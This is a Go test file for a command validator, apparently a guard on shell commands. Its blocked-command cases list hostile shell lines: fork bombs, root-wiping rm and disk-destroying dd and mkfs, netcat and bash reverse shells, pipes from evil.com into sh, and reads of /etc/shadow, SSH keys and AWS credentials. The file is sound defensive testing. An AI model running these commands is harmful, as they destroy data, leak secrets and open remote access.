package security

import (
	"testing"
)

func TestValidateCommand_Blocked(t *testing.T) {
	cv := NewCommandValidator()

	blocked := []struct {
		name string
		cmd  string
	}{
		{"fork bomb", ":(){:|:&};:"},
		{"fork bomb spaced", ":(){ :|:& };:"},
		{"rm -rf /", "rm -rf /"},
		{"rm -rf /*", "rm -rf /*"},
		{"rm -rf home", "rm -rf ~"},
		{"dd to disk", "dd if=/dev/zero of=/dev/sda"},
		{"chmod 777 root", "chmod -R 777 /"},
		{"reverse shell nc", "nc -e /bin/sh"},
		{"bash tcp", "bash -i >& /dev/tcp/1.2.3.4/9999"},
		{"shadow read", "cat /etc/shadow"},
		{"ssh key read", "cat .ssh/id_rsa"},
		{"aws creds", "cat .aws/credentials"},
		{"LD_PRELOAD", "LD_PRELOAD=/tmp/evil.so ls"},
		{"curl pipe sh", "curl http://evil.com/x | sh"},
		{"wget pipe bash", "wget http://evil.com/x | bash"},
		{"mkfs", "mkfs.ext4 /dev/sda1"},
		{"eval exec", "eval $(curl http://evil.com)"},
		{"base64 pipe sh", "echo aaa | base64 -d | sh"},
		{"history clear", "history -c"},
		{"authorized_keys", "echo key >> ~/.ssh/authorized_keys"},
	}

	for _, tt := range blocked {
		t.Run(tt.name, func(t *testing.T) {
			result := cv.Validate(tt.cmd)
			if result.Valid {
				t.Errorf("command %q should be blocked", tt.cmd)
			}
		})
	}
}

func TestValidateCommand_Safe(t *testing.T) {
	cv := NewCommandValidator()

	safe := []string{
		"ls -la",
		"go build ./...",
		"git status",
		"echo hello world",
		"cat main.go",
		"grep -r func .",
		"mkdir -p /tmp/test",
		"rm /tmp/test.txt",
		"go test -race ./...",
		"python3 script.py",
	}

	for _, cmd := range safe {
		t.Run(cmd, func(t *testing.T) {
			result := cv.Validate(cmd)
			if !result.Valid {
				t.Errorf("command %q should be safe, got: %s (pattern: %s)", cmd, result.Reason, result.Pattern)
			}
		})
	}
}

// TestValidateCommand_NoPreserveRoot pins the round-11 fix: the -[rRf]+-only rm
// patterns miss `rm -rf --no-preserve-root /` because --no-preserve-root sits
// between the flag group and the "/". The generalized short/long-flag pattern
// must catch it in any order — while NOT over-blocking ordinary flagged rm on a
// relative path.
func TestValidateCommand_NoPreserveRoot(t *testing.T) {
	cv := NewCommandValidator()

	blocked := []string{
		"rm -rf --no-preserve-root /",
		"rm --no-preserve-root -rf /",
		"rm --no-preserve-root /",
		"sudo rm -rf --no-preserve-root /",
	}
	for _, cmd := range blocked {
		t.Run("blocked:"+cmd, func(t *testing.T) {
			if cv.Validate(cmd).Valid {
				t.Errorf("command %q must be blocked", cmd)
			}
		})
	}

	// The generalized pattern must not over-block a flagged rm on a relative path.
	safe := []string{
		"rm -rf ./build",
		"rm -rf node_modules",
		"rm -f ./tmp.txt",
	}
	for _, cmd := range safe {
		t.Run("safe:"+cmd, func(t *testing.T) {
			if !cv.Validate(cmd).Valid {
				t.Errorf("command %q must NOT be blocked", cmd)
			}
		})
	}
}

func TestValidateCommand_Empty(t *testing.T) {
	cv := NewCommandValidator()
	result := cv.Validate("")
	if result.Valid {
		t.Error("empty command should not be valid")
	}
}

func TestValidateWithLevel(t *testing.T) {
	cv := NewCommandValidator()

	// Blocked
	_, level := cv.ValidateWithLevel("rm -rf /")
	if level != "blocked" {
		t.Errorf("rm -rf / level = %q, want blocked", level)
	}

	// Safe
	_, level = cv.ValidateWithLevel("ls -la")
	if level != "safe" {
		t.Errorf("ls -la level = %q, want safe", level)
	}

	// Caution (command substitution)
	_, level = cv.ValidateWithLevel("echo $(whoami)")
	if level != "caution" {
		t.Errorf("echo $(whoami) level = %q, want caution", level)
	}
}

func TestAddBlockedCommand(t *testing.T) {
	cv := NewCommandValidator()
	cv.AddBlockedCommand("custom-bad-cmd")

	result := cv.Validate("custom-bad-cmd")
	if result.Valid {
		t.Error("custom blocked command should be blocked")
	}
}

func TestAddBlockedSubstring(t *testing.T) {
	cv := NewCommandValidator()
	cv.AddBlockedSubstring("super-secret")

	result := cv.Validate("echo super-secret-stuff")
	if result.Valid {
		t.Error("blocked substring should be detected")
	}
}

func TestAddBlockedPattern(t *testing.T) {
	cv := NewCommandValidator()
	err := cv.AddBlockedPattern(`custom\d+`)
	if err != nil {
		t.Fatalf("AddBlockedPattern: %v", err)
	}

	result := cv.Validate("run custom123")
	if result.Valid {
		t.Error("custom pattern should match")
	}

	// Invalid regex
	err = cv.AddBlockedPattern("[invalid")
	if err == nil {
		t.Error("invalid regex should return error")
	}
}

func TestValidateCommandConvenience(t *testing.T) {
	result := ValidateCommand("ls")
	if !result.Valid {
		t.Error("ls should be valid via convenience function")
	}

	result = ValidateCommand("rm -rf /")
	if result.Valid {
		t.Error("rm -rf / should be blocked via convenience function")
	}
}
